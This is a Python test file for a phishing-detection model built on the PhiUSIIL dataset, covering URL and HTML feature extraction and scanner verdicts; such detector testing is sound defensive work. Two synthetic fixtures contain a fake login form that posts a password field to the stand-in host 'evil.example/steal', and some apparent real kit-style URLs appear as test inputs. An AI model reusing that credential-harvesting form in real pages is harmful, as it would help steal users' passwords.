"""PhiUSIIL loader, URL extractor, and HTML extractor."""

from __future__ import annotations

import pandas as pd
import pytest
from bs4 import BeautifulSoup

from phishing.config import PHIUSIIL_HTML_FEATURES, PHIUSIIL_MODEL_FEATURES, PHIUSIIL_URL_FEATURES
from phishing.data import grouped_split, load_phiusiil_xy
from phishing.features.fetch import FetchResult
from phishing.features.phiusiil_content import extract_phiusiil_content_features
from phishing.features.phiusiil_url import (
    char_continuation_rate,
    extract_phiusiil_url_features,
    is_domain_ip,
    is_kit_shaped_path,
)

# ``url_to_phiusiil_features`` fails closed without the trained legitimate-class
# medians, because all-zero HTML is the phishing prototype in this table. Tests
# that only care about the URL half pass explicit zeros and say so.
_ZERO_FILL = dict.fromkeys(PHIUSIIL_HTML_FEATURES, 0.0)


@pytest.fixture(scope="session")
def phiusiil_xy():
    return load_phiusiil_xy()


def test_phiusiil_extractor_requires_html_fill():
    """Never default unmeasured HTML to zeros — that row *is* a kit."""
    from phishing.features.extractor import url_to_phiusiil_features

    with pytest.raises(ValueError, match="html_fill is required"):
        url_to_phiusiil_features("https://www.example.com/", tier="A")


def test_phiusiil_loader_inverts_label_and_drops_leaks(phiusiil_xy):
    X, y, groups, tld_prob = phiusiil_xy
    assert list(X.columns) == PHIUSIIL_MODEL_FEATURES
    assert "URLSimilarityIndex" not in X.columns
    assert "FILENAME" not in X.columns
    assert set(y.unique()) <= {0, 1}
    # CSV label 0 is phishing; after recode that is the positive class (~0.43).
    assert 0.35 < float(y.mean()) < 0.50
    assert len(groups) == len(X)
    assert "com" in tld_prob
    assert tld_prob["com"] > 0.4


def test_phiusiil_grouped_split_does_not_leak_hosts(phiusiil_xy):
    X, y, groups, _ = phiusiil_xy
    _, _, _, _, g_tr, g_te = grouped_split(X, y, groups)
    assert set(g_tr).isdisjoint(set(g_te))


def test_url_features_https_ip_and_continuation():
    https = extract_phiusiil_url_features("https://www.example.com/login")
    assert https["IsHTTPS"] == 1
    assert https["IsDomainIP"] == 0
    assert https["CharContinuationRate"] == 1.0
    assert https["NoOfSubDomain"] == 0  # www is not a phishing-like extra label

    nested = extract_phiusiil_url_features("https://login.example.com/session")
    assert nested["NoOfSubDomain"] == 1

    http_ip = extract_phiusiil_url_features("http://192.0.2.10/login")
    assert http_ip["IsHTTPS"] == 0
    assert http_ip["IsDomainIP"] == 1
    assert is_domain_ip("http://192.0.2.10/") == 1

    hyphen = char_continuation_rate("paypal-secure.example.com", "com")
    assert hyphen < 1.0


def test_www_prefix_is_not_an_extra_special_char():
    """Apex hosts must match www hosts. PhiUSIIL legit rows all have www."""
    apex = extract_phiusiil_url_features("https://github.com/")
    www = extract_phiusiil_url_features("https://www.github.com/")
    assert apex["NoOfSubDomain"] == www["NoOfSubDomain"] == 0
    assert apex["DomainLength"] == www["DomainLength"]
    assert apex["NoOfOtherSpecialCharsInURL"] == www["NoOfOtherSpecialCharsInURL"]
    assert apex["URLLength"] == www["URLLength"]
    assert apex["NoOfOtherSpecialCharsInURL"] == 1
    # CSV NoOfOtherSpecialCharsInURL is 1 for https://www.southbankmosaics.com
    brand = extract_phiusiil_url_features("https://www.southbankmosaics.com")
    assert brand["NoOfOtherSpecialCharsInURL"] == 1


def test_path_and_trailing_slash_do_not_change_origin_counts():
    """No legitimate PhiUSIIL row has a path or trailing slash."""
    bare = extract_phiusiil_url_features("https://github.com")
    slash = extract_phiusiil_url_features("https://github.com/")
    login = extract_phiusiil_url_features("https://github.com/login")
    visa = extract_phiusiil_url_features("https://www.visa.com/en-us")
    visa_home = extract_phiusiil_url_features("https://visa.com")
    for key in (
        "URLLength",
        "NoOfLettersInURL",
        "NoOfOtherSpecialCharsInURL",
        "LetterRatioInURL",
        "DomainLength",
        "IsHTTPS",
    ):
        assert bare[key] == slash[key] == login[key]
        assert visa[key] == visa_home[key]
    assert slash["NoOfQMarkInURL"] == 0
    # =?&% are counted on the same origin string as length and letters. When
    # they were counted on the full URL, a legitimate deep link still carried
    # the query-shape leak that moving length onto the origin was meant to fix.
    query = extract_phiusiil_url_features("https://github.com/search?q=1")
    assert query["NoOfQMarkInURL"] == 0
    assert query["NoOfEqualsInURL"] == 0
    assert query["URLLength"] == bare["URLLength"]
    encoded = extract_phiusiil_url_features("https://github.com/a%2Fb")
    assert encoded["NoOfObfuscatedChar"] == 0
    assert encoded["HasObfuscation"] == 0


def test_url_features_keys_match_model():
    feats = extract_phiusiil_url_features("https://www.example.com/", tld_prob={"com": 0.5})
    assert set(feats) == set(PHIUSIIL_URL_FEATURES)
    assert feats["TLDLegitimateProb"] == 0.5


def test_html_features_detect_social_password_and_copyright():
    html = """
    <html>
      <head>
        <title>Example Bank</title>
        <meta name="viewport" content="width=device-width">
        <meta name="description" content="A bank">
        <meta name="robots" content="index">
        <link rel="icon" href="/favicon.ico">
        <link rel="stylesheet" href="/app.css">
        <script src="/app.js"></script>
      </head>
      <body>
        <p>Copyright 2024 Example</p>
        <a href="https://facebook.com/example">social</a>
        <a href="/about">about</a>
        <a href="#"></a>
        <form action="https://evil.example/steal">
          <input type="password" name="pw">
          <input type="hidden" name="tok">
          <input type="submit" value="Go">
        </form>
        <iframe src="/x"></iframe>
        <img src="/logo.png">
      </body>
    </html>
    """
    soup = BeautifulSoup(html, "lxml")
    fetch = FetchResult(
        url="https://www.example.com/",
        final_url="https://www.example.com/",
        ok=True,
        status_code=200,
        html=html,
        soup=soup,
        n_redirects=0,
    )
    feats = extract_phiusiil_content_features(fetch, "https://www.example.com/")

    assert set(feats) == set(PHIUSIIL_HTML_FEATURES)
    assert feats["HasSocialNet"] == 1
    assert feats["HasCopyrightInfo"] == 1
    assert feats["HasPasswordField"] == 1
    assert feats["HasExternalFormSubmit"] == 1
    assert feats["IsResponsive"] == 1
    assert feats["HasTitle"] == 1
    assert feats["DomainTitleMatchScore"] > 0
    assert feats["NoOfiFrame"] == 1
    assert feats["NoOfJS"] >= 1
    assert feats["NoOfSelfRef"] >= 1
    assert feats["NoOfEmptyRef"] >= 1
    assert feats["NoOfExternalRef"] >= 1


def test_phiusiil_tier_a_extractor_offline():
    from phishing.features.extractor import url_to_phiusiil_features

    series, warnings, probe = url_to_phiusiil_features(
        "https://www.example.com/login", tier="A", html_fill=_ZERO_FILL
    )
    assert list(series.index) == PHIUSIIL_MODEL_FEATURES
    assert series["IsHTTPS"] == 1
    assert probe.status == "not_probed"
    skipped_html = {w.feature for w in warnings}
    assert "HasSocialNet" in skipped_html
    assert "LineOfCode" in skipped_html


def test_minified_html_uses_tag_count_for_line_of_code():
    html = "<html>" + "".join(f"<div>{i}</div>" for i in range(50)) + "</html>"
    soup = BeautifulSoup(html, "lxml")
    fetch = FetchResult(
        url="https://www.example.com/",
        final_url="https://www.example.com/",
        ok=True,
        status_code=200,
        html=html,
        soup=soup,
        n_redirects=0,
    )
    feats = extract_phiusiil_content_features(fetch, "https://www.example.com/")
    assert feats["LineOfCode"] >= 50


def _rich_legit_html(title: str = "GitHub") -> str:
    parts = [
        f"<html><head><title>{title}</title>",
        '<meta name="viewport" content="width=device-width">',
        f'<meta name="description" content="{title}">',
        '<meta name="robots" content="index">',
        '<link rel="icon" href="/favicon.ico">',
        '<link rel="stylesheet" href="/app.css">',
    ]
    parts.extend(f'<script src="/js{i}.js"></script>' for i in range(15))
    parts.append("</head><body>")
    parts.extend(f'<a href="/page{i}">p{i}</a>' for i in range(80))
    parts.extend(f'<a href="https://cdn{i}.example.net/x">x</a>' for i in range(45))
    parts.append('<a href="https://twitter.com/github">twitter</a>')
    parts.append('<a href="https://facebook.com/github">facebook</a>')
    parts.extend(f'<img src="/img{i}.png">' for i in range(25))
    parts.append(f"<p>Copyright 2026 {title}</p></body></html>")
    return "\n".join(parts)


def _spa_shell_html(title: str = "GitHub") -> str:
    """Next.js-like markup: many scripts, almost no crawlable <a> tags."""
    scripts = "\n".join(
        f'<script src="/_next/static/chunks/chunk{i}.js"></script>' for i in range(8)
    )
    return (
        "<!DOCTYPE html><html><head>"
        f"<title>{title}</title><meta charset='utf-8'>"
        f"{scripts}</head><body><div id='__next'></div></body></html>"
    )


def test_js_shell_html_imputes_links_and_is_not_phishing():
    from phishing.features.extractor import url_to_phiusiil_features
    from phishing.scanner import scan
    from phishing.tuning import load_model

    try:
        estimator, artifact = load_model()
    except FileNotFoundError:
        pytest.skip("no trained model")
    if artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL")

    html_fill = artifact.extra.get("html_fill") or {}
    assert html_fill.get("NoOfExternalRef", 0) > 0
    cases = (
        ("https://github.com/", "GitHub"),
        ("https://ramp.com", "Ramp"),
        ("https://www.visa.com/en-us", "Visa"),
    )
    warn = float(artifact.threshold)
    for url, title in cases:
        html = _spa_shell_html(title)
        soup = BeautifulSoup(html, "lxml")
        fetch = FetchResult(
            url=url,
            final_url=url,
            ok=True,
            status_code=200,
            html=html,
            soup=soup,
            n_redirects=0,
        )
        feats, warnings, probe = url_to_phiusiil_features(
            url,
            tier="B",
            fetch=fetch,
            tld_prob=artifact.extra.get("tld_legit_prob") or {},
            html_fill=html_fill,
        )
        assert probe.page_fetched
        assert feats["NoOfExternalRef"] == pytest.approx(float(html_fill["NoOfExternalRef"]))
        assert feats["NoOfSelfRef"] == pytest.approx(float(html_fill["NoOfSelfRef"]))
        assert feats["LineOfCode"] == pytest.approx(float(html_fill["LineOfCode"]))
        assert any("JavaScript shell" in w.message for w in warnings)
        proba = float(
            estimator.predict_proba(feats[artifact.feature_names].to_frame().T)[:, 1][0]
        )
        assert proba < warn, f"{url} SPA p={proba:.4f} >= warn {warn:.3f}"

        result = scan(url, tier="B", fetch=fetch)
        assert result["url_only"] is False
        assert result["probability"] < warn, (
            f"{url} scan p={result['probability']:.4f} >= warn {warn:.3f}"
        )
        assert result["verdict"] not in {"phishing", "suspicious"}
        notes = " ".join(result.get("notes") or [])
        assert "mostly JavaScript" in notes


def _minified_brand_html(title: str = "Visa") -> str:
    """Production-like minified homepage: some links, one enormous script line."""
    blob = "x" * 80_000
    links = "".join(f'<a href="/page{i}">p{i}</a>' for i in range(12))
    scripts = "".join(f'<script src="/js{i}.js"></script>' for i in range(8))
    images = "".join(f'<img src="/img{i}.png" alt="i">' for i in range(6))
    markup = "".join(f"<div class='s{i}'><span>x</span></div>" for i in range(200))
    return (
        f"<html><head><title>Access payment solutions | {title}</title>"
        f'<meta name="viewport" content="width=device-width">'
        f'<meta name="description" content="{title} cards">'
        f'<link rel="icon" href="/favicon.ico">'
        f"<script>{blob}</script>{scripts}"
        "</head><body>"
        f"{links}<a href='https://twitter.com/visa'>twitter</a>{images}{markup}"
        f"<p>Copyright 2026 {title}</p></body></html>"
    )


def test_minified_visa_html_is_not_phishing():
    """Live Visa HTML is ~20 lines with a 400k char line; PhiUSIIL treated that as a kit."""
    from phishing.features.extractor import url_to_phiusiil_features
    from phishing.scanner import scan
    from phishing.tuning import load_model

    try:
        estimator, artifact = load_model()
    except FileNotFoundError:
        pytest.skip("no trained model")
    if artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL")

    html_fill = artifact.extra.get("html_fill") or {}
    html = _minified_brand_html("Visa")
    soup = BeautifulSoup(html, "lxml")
    fetch = FetchResult(
        url="https://www.visa.com/en-us",
        final_url="https://www.visa.com/en-us",
        ok=True,
        status_code=200,
        html=html,
        soup=soup,
        n_redirects=0,
    )
    feats, warnings, probe = url_to_phiusiil_features(
        "https://www.visa.com/en-us",
        tier="B",
        fetch=fetch,
        tld_prob=artifact.extra.get("tld_legit_prob") or {},
        html_fill=html_fill,
    )
    assert probe.page_fetched
    assert feats["LargestLineLength"] == pytest.approx(float(html_fill["LargestLineLength"]))
    assert any("Minified HTML" in w.message for w in warnings)
    warn = float(artifact.threshold)
    proba = float(estimator.predict_proba(feats[artifact.feature_names].to_frame().T)[:, 1][0])
    assert proba < warn, f"minified Visa p={proba:.4f} >= warn {warn:.3f}"

    result = scan("https://www.visa.com/en-us", tier="B", fetch=fetch)
    assert result["verdict"] not in {"phishing", "suspicious"}
    assert result["probability"] < warn
    notes = " ".join(result.get("notes") or []).lower()
    assert "minified" not in notes
    assert "longest html line" not in notes
    assert "legitimate-class median" not in notes


def test_github_shaped_html_is_not_phishing():
    from phishing.features.extractor import url_to_phiusiil_features
    from phishing.tuning import load_model

    try:
        estimator, artifact = load_model()
    except FileNotFoundError:
        pytest.skip("no trained model")
    if artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL")

    html = _rich_legit_html("GitHub")
    soup = BeautifulSoup(html, "lxml")
    fetch = FetchResult(
        url="https://github.com/",
        final_url="https://github.com/",
        ok=True,
        status_code=200,
        html=html,
        soup=soup,
        n_redirects=0,
    )
    tld_prob = artifact.extra.get("tld_legit_prob") or {}
    html_fill = artifact.extra.get("html_fill") or {}
    feats, _, probe = url_to_phiusiil_features(
        "https://github.com/",
        tier="B",
        fetch=fetch,
        tld_prob=tld_prob,
        html_fill=html_fill,
    )
    assert probe.page_fetched
    assert feats["HasSocialNet"] == 1
    assert feats["HasCopyrightInfo"] == 1
    assert feats["NoOfSelfRef"] >= 80
    assert feats["NoOfExternalRef"] >= 40
    assert feats["LineOfCode"] >= 100
    proba = float(estimator.predict_proba(feats[artifact.feature_names].to_frame().T)[:, 1][0])
    assert proba < float(artifact.threshold)


def test_visa_shaped_html_is_not_phishing():
    from phishing.features.extractor import url_to_phiusiil_features
    from phishing.tuning import load_model

    try:
        estimator, artifact = load_model()
    except FileNotFoundError:
        pytest.skip("no trained model")
    if artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL")

    html = _rich_legit_html("Visa")
    soup = BeautifulSoup(html, "lxml")
    fetch = FetchResult(
        url="https://www.visa.com/en-us",
        final_url="https://www.visa.com/en-us",
        ok=True,
        status_code=200,
        html=html,
        soup=soup,
        n_redirects=0,
    )
    feats, _, probe = url_to_phiusiil_features(
        "https://www.visa.com/en-us",
        tier="B",
        fetch=fetch,
        tld_prob=artifact.extra.get("tld_legit_prob") or {},
        html_fill=artifact.extra.get("html_fill") or {},
    )
    assert probe.page_fetched
    proba = float(estimator.predict_proba(feats[artifact.feature_names].to_frame().T)[:, 1][0])
    assert proba < float(artifact.threshold)


def test_free_hosting_platform_feature_marks_shared_hosts():
    from phishing.features.phiusiil_url import is_free_hosting_platform, platform_suffix

    assert is_free_hosting_platform("https://kit.firebaseapp.com/login") == 1
    assert is_free_hosting_platform("https://mysite.wixsite.com/home") == 1
    assert is_free_hosting_platform("https://vercel.app") == 1
    assert is_free_hosting_platform("https://github.com/") == 0
    assert is_free_hosting_platform("https://www.visa.com/en-us") == 0
    assert platform_suffix("abc.vercel.app") == "vercel.app"
    assert platform_suffix("example.com") == ""

    # Subdomain depth is NOT rebased onto the platform suffix. Doing so cost
    # 4.7 points of live recall in scripts/07_live_sample_eval.py, because it also lowers every
    # kit parked on the same suffix.
    assert extract_phiusiil_url_features("https://abc.vercel.app")["NoOfSubDomain"] == 1


def test_free_hosting_platform_is_not_a_model_input():
    """The platform flag stays a routing hint; as a feature it was a class leak.

    PhiUSIIL has 22,478 phishing rows on these suffixes and exactly one
    legitimate row. Trained as an input it took second place by importance and
    scored real docs sites at p ≈ 0.999, so it must never reach the estimator.
    """
    assert "IsFreeHostingPlatform" not in PHIUSIIL_URL_FEATURES
    assert "IsFreeHostingPlatform" not in PHIUSIIL_MODEL_FEATURES
    feats = extract_phiusiil_url_features("https://kit.firebaseapp.com/login")
    assert "IsFreeHostingPlatform" not in feats


def test_kit_shaped_path_is_a_routing_hint_not_a_model_input():
    """Kit landing files must not go back into URLLength / specials.

    Counting any path re-leaks /en-us into the phishing class. The hint is
    only for the withheld URL-pattern chip.
    """
    assert "IsKitShapedPath" not in PHIUSIIL_URL_FEATURES
    assert "IsKitShapedPath" not in PHIUSIIL_MODEL_FEATURES
    assert is_kit_shaped_path("https://healtyworld.mx/wetj/famt.html") is True
    assert is_kit_shaped_path("https://dkb-kredit-online.example/dkb-banking/login.php") is True
    assert is_kit_shaped_path("https://inzizi.com/") is False
    assert is_kit_shaped_path("https://inzizi.com") is False
    assert is_kit_shaped_path("https://www.visa.com/en-us") is False
    assert is_kit_shaped_path("https://github.com/python/cpython") is False
    assert is_kit_shaped_path("https://github.com/") is False
    feats = extract_phiusiil_url_features("https://healtyworld.mx/wetj/famt.html")
    origin = extract_phiusiil_url_features("https://healtyworld.mx")
    assert feats["URLLength"] == origin["URLLength"]
    assert "IsKitShapedPath" not in feats


def test_platform_hosts_still_carry_the_tld_prior_leak():
    """Documents a *separate* leak that removing IsFreeHostingPlatform does not fix.

    PhiUSIIL has almost no legitimate ``.io`` / ``.app`` rows, so
    TLDLegitimateProb is 0.013 and 0.0015 for those TLDs. The URL-only model
    therefore still scores real docs sites and app deployments at p ≈ 0.83–0.95
    on the URL string alone. This is a property of the training table, not of
    the platform feature, and it is why the scanner must not publish a
    URL-string judgment as a live-site verdict. Locked in so a future TLD-prior
    fix has a failing test to flip.
    """
    from phishing.tuning import load_payload

    try:
        payload = load_payload()
    except FileNotFoundError:
        pytest.skip("no trained model")
    artifact = payload["artifact"]
    url_est = payload.get("url_estimator")
    if url_est is None or artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL URL-only")

    tld_prob = artifact.extra.get("tld_legit_prob") or {}
    feature_names = list(artifact.extra.get("url_features") or PHIUSIIL_URL_FEATURES)
    for url in ("https://docs.github.io", "https://nextjs.vercel.app"):
        feats = extract_phiusiil_url_features(url, tld_prob=tld_prob)
        row = pd.DataFrame([{name: feats[name] for name in feature_names}])
        proba = float(url_est.predict_proba(row)[:, 1][0])
        assert proba > 0.5, f"{url} p={proba:.4f}: TLD-prior leak appears fixed"


def _kit_shaped_html(title: str = "Sign in") -> str:
    """Thin login page: a password form and nothing else a crawler can use."""
    return (
        f"<html><head><title>{title}</title></head><body>"
        '<form action="https://evil.example/steal">'
        '<input type="password" name="pw"><input type="hidden" name="tok">'
        '<input type="submit" value="Sign in"></form>'
        "</body></html>"
    )


class _FixedProba:
    """Estimator stub returning one probability, whatever the row."""

    def __init__(self, p: float):
        self.p = p

    def predict_proba(self, X):
        import numpy as np

        return np.tile([[1.0 - self.p, self.p]], (len(X), 1))


def _stub_payload(monkeypatch, page_p: float, url_p: float):
    """Real artifact and thresholds, stubbed estimators.

    Live pages that pin the page model at p ≈ 1.0 cannot be reproduced with
    synthetic markup, so the reconciliation rule is exercised directly.
    """
    import phishing.scanner as scanner
    from phishing.tuning import load_payload

    payload = dict(load_payload())
    payload["estimator"] = _FixedProba(page_p)
    payload["url_estimator"] = _FixedProba(url_p)
    monkeypatch.setattr(scanner, "_loaded_payload", lambda: payload)
    return payload["artifact"]


def _fetch_for(url: str, html: str) -> FetchResult:
    return FetchResult(
        url=url,
        final_url=url,
        ok=True,
        status_code=200,
        html=html,
        soup=BeautifulSoup(html, "lxml"),
        n_redirects=0,
    )


def test_url_disagreement_pulls_down_a_rich_legitimate_page(monkeypatch):
    """A modern homepage that pins the page model at ~1.0 must not stay phishing.

    NoOfExternalRef / LineOfCode / NoOfSelfRef are 76% of the page model and
    are exactly the columns that shifted since the 2023 crawl. When the URL
    string disagrees, the URL score is the honest one.
    """
    from phishing.scanner import scan

    try:
        _stub_payload(monkeypatch, page_p=0.999, url_p=0.02)
    except FileNotFoundError:
        pytest.skip("no trained model")

    url = "https://www.soschildrensvillages.org.uk"
    result = scan(url, tier="B", fetch=_fetch_for(url, _rich_legit_html("SOS")))

    assert result["url_disagreement"] is True
    assert result["page_probability"] == pytest.approx(0.999)
    assert result["probability"] == pytest.approx(result["url_probability"])
    assert result["verdict"] not in {"phishing", "suspicious"}
    assert "URL disagreement" in result["model"]
    assert any("drift" in note for note in result["notes"])


def test_url_disagreement_leaves_an_agreeing_page_alone(monkeypatch):
    """Both models call it a kit: nothing to reconcile, the score stands."""
    from phishing.scanner import scan

    try:
        _stub_payload(monkeypatch, page_p=0.999, url_p=0.99)
    except FileNotFoundError:
        pytest.skip("no trained model")

    url = "https://login-verify-account.example.com/signin"
    result = scan(url, tier="B", fetch=_fetch_for(url, _kit_shaped_html()))

    assert result["url_disagreement"] is False
    assert result["probability"] == pytest.approx(0.999)
    assert result["verdict"] == "phishing"


def test_url_disagreement_does_not_excuse_a_free_hosting_kit(monkeypatch):
    """The platform hint's whole job.

    A kit on shared hosting has a clean-looking URL by construction, so the
    disagreement rule would otherwise talk it down to legitimate. Same scores
    as the rich-page case above; only the hostname differs.
    """
    from phishing.scanner import scan

    try:
        _stub_payload(monkeypatch, page_p=0.999, url_p=0.02)
    except FileNotFoundError:
        pytest.skip("no trained model")

    url = "https://secure-login-verify.firebaseapp.com/"
    result = scan(url, tier="B", fetch=_fetch_for(url, _kit_shaped_html()))

    assert result["url_disagreement"] is False
    assert result["probability"] == pytest.approx(0.999)
    assert result["verdict"] == "phishing"


def test_unreachable_host_reports_a_url_pattern_risk():
    """Withheld verdicts still carry a URL-string judgment for the UI chip."""
    from phishing.scanner import scan
    from phishing.tuning import load_payload

    try:
        load_payload()
    except FileNotFoundError:
        pytest.skip("no trained model")

    fetch = FetchResult(
        url="http://paypal-secure-login-verify.example/confirm",
        final_url="http://paypal-secure-login-verify.example/confirm",
        ok=False,
        status_code=None,
        html=None,
        soup=None,
        n_redirects=0,
        error="name resolution failed",
        error_kind="dns",
    )
    result = scan(
        "http://paypal-secure-login-verify.example/confirm", tier="B", fetch=fetch
    )
    assert result["verdict"] == "unreachable"
    assert result["risk"] is None  # still no live-site rating
    # Safe-side origin scores are no longer emitted as a chip on withheld scans.
    assert result["url_pattern_risk"] in {"phishing", "suspicious", None}


def _dns_fail(url: str) -> FetchResult:
    return FetchResult(
        url=url,
        final_url=url,
        ok=False,
        status_code=None,
        html=None,
        soup=None,
        n_redirects=0,
        error="name resolution failed",
        error_kind="dns",
    )


def test_unreachable_kit_path_flags_the_url_pattern_chip():
    """A dead host with a kit landing file must not read as a clean origin."""
    from phishing.scanner import scan
    from phishing.tuning import load_payload

    try:
        load_payload()
    except FileNotFoundError:
        pytest.skip("no trained model")

    url = "https://healtyworld.mx/wetj/famt.html"
    result = scan(url, tier="B", fetch=_dns_fail(url))
    assert result["verdict"] == "unreachable"
    assert result["risk"] is None
    assert result["url_pattern_risk"] == "phishing"
    assert any("path looks like a phishing kit" in note for note in result["notes"])
    assert "looks like phishing" in result["rationale"]


def test_unreachable_homepage_does_not_claim_the_string_is_safe():
    """Empty-page kits leave no URL-string evidence once the host is dead."""
    from phishing.scanner import scan
    from phishing.tuning import load_payload

    try:
        load_payload()
    except FileNotFoundError:
        pytest.skip("no trained model")

    url = "https://inzizi.com/"
    result = scan(url, tier="B", fetch=_dns_fail(url))
    assert result["verdict"] == "unreachable"
    assert result["risk"] is None
    assert result["url_pattern_risk"] is None
    assert "legitimate" not in result["rationale"].lower()
    assert "does not look like phishing" not in result["rationale"]
    assert "not a finding that the site is safe" in result["rationale"]


def test_url_only_model_does_not_flag_apex_https_brands():
    """Failed fetch / tier A must not report p≈1.0 from a missing www. label."""
    from phishing.tuning import load_payload

    try:
        payload = load_payload()
    except FileNotFoundError:
        pytest.skip("no trained model")
    artifact = payload["artifact"]
    url_est = payload.get("url_estimator")
    if url_est is None or artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
        pytest.skip("served model is not PhiUSIIL URL-only")

    tld_prob = artifact.extra.get("tld_legit_prob") or {}
    feature_names = list(artifact.extra.get("url_features") or PHIUSIIL_URL_FEATURES)
    warn = float(artifact.extra.get("url_threshold", artifact.threshold))
    urls = (
        "https://github.com/",
        "https://ramp.com",
        "https://www.visa.com/en-us",
        "https://www.github.com/",
        "https://www.ramp.com",
    )
    for url in urls:
        feats = extract_phiusiil_url_features(url, tld_prob=tld_prob)
        row = pd.DataFrame([{name: feats[name] for name in feature_names}])
        proba = float(url_est.predict_proba(row)[:, 1][0])
        assert proba < warn, f"{url} URL-only p={proba:.4f} >= warn {warn:.3f}"
        assert proba < 0.5, f"{url} URL-only p={proba:.4f} still looks like a kit"
